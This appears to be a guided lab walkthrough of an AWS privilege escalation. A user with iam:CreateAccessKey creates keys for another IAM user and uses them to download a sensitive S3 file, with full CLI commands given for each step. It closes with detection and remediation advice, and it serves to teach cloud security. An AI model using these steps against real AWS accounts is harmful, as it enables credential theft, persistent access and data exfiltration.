# Guided Walkthrough: One-Hop Privilege Escalation via iam:CreateAccessKey to S3 Bucket

This scenario demonstrates a privilege escalation vulnerability where a user has permission to create access keys for another user with S3 bucket access. The attacker creates new access keys for the privileged user and uses those credentials to access sensitive S3 buckets.

The `iam:CreateAccessKey` permission is one of the most straightforward credential-access escalation paths in AWS. When granted without resource-level constraints, it allows any principal holding it to mint long-lived programmatic credentials for any other IAM user in the account — including users with access to sensitive data stores. In real environments, this misconfiguration often appears when developers are granted broad IAM read/write permissions to manage service accounts, or when an overly permissive policy is copy-pasted from a template.

The attack is silent from an authorization perspective: creating an access key for another user requires no MFA challenge, generates no service-controlled alert, and leaves the victim user's original credentials intact. Only CloudTrail and a well-tuned SIEM stand between an attacker and undetected data exfiltration.

## The Challenge

You start with credentials for `pl-prod-iam-002-to-bucket-privesc-user` — an IAM user with a single meaningful permission: `iam:CreateAccessKey` scoped to `pl-prod-iam-002-to-bucket-access-user`. Your starting user cannot list S3 buckets, cannot read objects, and has no direct path to the sensitive data.

The target is `pl-prod-iam-002-to-bucket-{account_id}`, an S3 bucket containing a file called `sensitive-data.txt`. The bucket access user (`pl-prod-iam-002-to-bucket-access-user`) has `s3:GetObject` and `s3:PutObject` on this bucket, but you don't have its credentials yet.

Your job is to get them.

## Reconnaissance

First, verify who you are and confirm what you can and can't do.

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-iam-002-to-bucket-privesc-user
```

Try to access S3 directly to confirm you're blocked:

```bash
aws s3 ls
# An error occurred (AccessDenied) when calling the ListBuckets operation: Access Denied
```

Good — you have no S3 access as the starting user. Now use your helpful permissions to understand the target landscape. List users in the account to spot candidates with data access:

```bash
aws iam list-users --query 'Users[].UserName' --output table
```

You'll see `pl-prod-iam-002-to-bucket-access-user`. Inspect its policies to understand what it can do:

```bash
aws iam list-attached-user-policies \
  --user-name pl-prod-iam-002-to-bucket-access-user

aws iam list-user-policies \
  --user-name pl-prod-iam-002-to-bucket-access-user
```

The inline policy (or attached managed policy) reveals S3 read/write permissions on `pl-prod-iam-002-to-bucket-*`. That's your target. Time to escalate.

## Exploitation

The escalation is a single API call. As `pl-prod-iam-002-to-bucket-privesc-user`, create new access keys for the bucket access user:

```bash
aws iam create-access-key \
  --user-name pl-prod-iam-002-to-bucket-access-user \
  --output json
```

You'll receive a response containing `AccessKeyId` and `SecretAccessKey`. Store them:

```bash
export AWS_ACCESS_KEY_ID="<new-key-id>"
export AWS_SECRET_ACCESS_KEY="<new-secret>"
unset AWS_SESSION_TOKEN
```

Wait about 15 seconds for the keys to propagate through AWS's IAM system, then confirm your new identity:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-iam-002-to-bucket-access-user
```

## Verification

Find the target bucket:

```bash
aws s3api list-buckets \
  --query "Buckets[?starts_with(Name, 'pl-prod-iam-002-to-bucket-')].Name" \
  --output text
```

List its contents:

```bash
aws s3 ls s3://pl-prod-iam-002-to-bucket-{account_id}/
```

Download the sensitive file:

```bash
aws s3 cp s3://pl-prod-iam-002-to-bucket-{account_id}/sensitive-data.txt .
cat sensitive-data.txt
```

You now have the contents of the sensitive data file. The escalation is complete.

## What Happened

Starting from a user with no direct data access, you used `iam:CreateAccessKey` to mint a second set of long-lived credentials for a user that did have S3 access. This is a one-hop escalation: one IAM action, one new identity, one target compromised.

In a real breach, this technique lets an attacker maintain persistent, independent access to a data store even after the original compromise vector is detected and revoked — the newly created access key is entirely separate from any credentials the legitimate user holds. The victim user's own access keys continue to work, making the compromise harder to notice without active CloudTrail monitoring for `CreateAccessKey` events on users with sensitive permissions.

The fix is straightforward: never grant `iam:CreateAccessKey` without a resource-level condition scoped to non-privileged users, and alert on every `CreateAccessKey` call that targets a user with S3 or other data access.
